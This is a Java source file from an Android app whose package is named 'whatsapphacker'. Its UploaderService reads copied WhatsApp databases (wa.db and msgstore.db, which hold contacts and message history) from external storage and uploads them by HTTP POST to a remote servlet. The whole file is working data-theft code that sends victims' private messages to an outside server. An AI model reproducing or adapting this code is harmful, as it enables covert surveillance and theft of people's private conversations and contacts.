package com.electricdroid.whatsapphacker;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by anki on 16-07-2015.
 */
public class UploaderService extends IntentService {
    public UploaderService() {
        super(UploaderService.class.getName());
    }

    public UploaderService(String name) {
        // Used to name the worker thread
        // Important only for debugging
        super(UploaderService.class.getName());
        setIntentRedelivery(true);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        //get user name from sharedprefs
        String username = getSharedPreferences("myprefs",MODE_PRIVATE).getString("username",null);
        if(username == null){
            throw new RuntimeException("Unable to get username");
        }
        String pathWaDB =Environment.getExternalStorageDirectory().getPath()+"/tmp/wa-"+username+".db";
        String pathmsgStoreDB =Environment.getExternalStorageDirectory().getPath()+"/tmp/msgstore-"+username+".db";
        String url = "http://"+ getResources().getString(R.string.server_address)+"/WAWebService/UploadServlet";
        String uploadWaResponse = test(url,pathWaDB);
        String uploadMsgstoreResponse = null;
        uploadMsgstoreResponse = test(url,pathmsgStoreDB);
        Log.d("file_uploads",uploadWaResponse + ", " +uploadMsgstoreResponse);

    }

    private String test(String urlServer, String pathToOurFile) {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        DataInputStream inputStream = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 100;
        String serverResponseMessage = null;
        StringBuffer sb = null;
        try {
            if(!new File(pathToOurFile).exists()){
                return pathToOurFile + " not found.";
            }
            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));

            URL url1 = new URL(urlServer);
            connection = (HttpURLConnection) url1.openConnection();

            // Allow Inputs & Outputs.
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);

            // Set HTTP method to POST.
            connection.setRequestMethod("POST");

            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\"" + pathToOurFile + "\"" + lineEnd);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // Read file
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                Log.d("anki", String.valueOf(bytesRead));
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)
            int serverResponseCode = connection.getResponseCode();
            serverResponseMessage = connection.getResponseMessage();
            System.out.println(serverResponseCode + " : " + serverResponseMessage);
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
            InputStream responseStream = connection.getInputStream();

            InputStreamReader isr = new InputStreamReader(responseStream);
            BufferedReader bf = new BufferedReader(isr);
            String resPart;
            sb = new StringBuffer();
            while ((resPart = bf.readLine()) != null) {
                sb.append(resPart);
            }

            connection.disconnect();
        } catch (Exception ex) {
            //Exception handling
        }
        Log.d("anki",sb.toString());
        return sb.toString();
    }

}

